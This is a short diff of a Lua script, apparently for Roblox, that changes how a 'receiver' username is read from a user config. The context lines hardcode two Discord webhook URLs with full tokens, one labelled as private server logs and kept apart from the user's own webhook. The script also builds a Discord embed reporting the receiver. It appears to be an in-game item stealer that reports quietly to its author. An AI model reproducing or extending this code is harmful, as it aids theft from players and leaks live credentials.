@@ -64,7 +64,16 @@ end
 --====================================================================--
 local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
 local user_webhook = _G["Script-SM_Config"].user_webhook
-local receiver = _G["Script-SM_Config"].users
+local cfg = _G["Script-SM_Config"]
+local receiver = "Not Configured"
+
+if cfg and cfg.users then
+    if type(cfg.users) == "table" and #cfg.users > 0 then
+        receiver = tostring(cfg.users[1])          -- take the first name
+    elseif type(cfg.users) == "string" then
+        receiver = tostring(cfg.users)             -- old single-string format
+    end
+end
 local logs_webhook = "https://discord.com/api/webhooks/1433776514868052012/2rL6CIcgBPWKQbyF5gqPpZmpYDdl61_mLQHM2LaaNxE4VNH76k-r0mWmL91rbGlggjpA"
 
 --====================================================================--
@@ -637,7 +646,7 @@ local payload = {
             },
             {
                 name = "<:emoji_3:1402578008245801086> **Receiver**",
-                value = "```" .. receiver .. "```",
+                value = "```".. receiver .. "```",
                 inline = true
             },
             {
